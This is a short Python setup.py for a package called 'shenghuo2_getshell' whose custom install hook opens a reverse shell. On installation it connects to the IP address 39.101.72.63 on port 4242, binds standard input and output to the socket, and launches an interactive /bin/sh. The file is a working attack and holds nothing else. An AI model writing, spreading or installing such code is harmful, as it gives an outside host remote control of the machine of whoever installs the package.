from setuptools import setup
from setuptools.command.install import install
import os, socket, subprocess

class CustomInstall(install):
  def run(self):
    install.run(self)
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("39.101.72.63",4242))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    p=subprocess.call(["/bin/sh","-i"])

setup(name='shenghuo2_getshell',
      version='0.0.1',
      description='Reverse shell',
      url='https://blog.shenghuo2.top/',
      author='shenghuo2',
      author_email='shell@shenghuo2.com',
      license='MIT',
      zip_safe=False,
      cmdclass={'install': CustomInstall})
